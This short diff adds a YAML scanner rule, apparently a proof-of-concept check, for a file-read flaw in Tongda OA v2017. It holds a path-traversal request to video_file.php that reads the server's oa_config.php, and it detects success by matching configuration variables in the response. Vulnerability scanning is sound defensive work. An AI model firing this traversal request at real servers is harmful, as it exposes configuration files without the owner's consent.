@@ -1,0 +1,8 @@
+name: tongda-v2017-video-file-file-read
+rules:
+  - method: GET
+    path: "/general/mytable/intel_view/video_file.php?MEDIA_DIR=../../../inc/&MEDIA_NAME=oa_config.php"
+    expression: |
+      response.status == 200 && response.body.bcontains(b'$ROOT_PATH') && response.body.bcontains(b'$ATTACH_PATH')
+detail:
+  author: 666
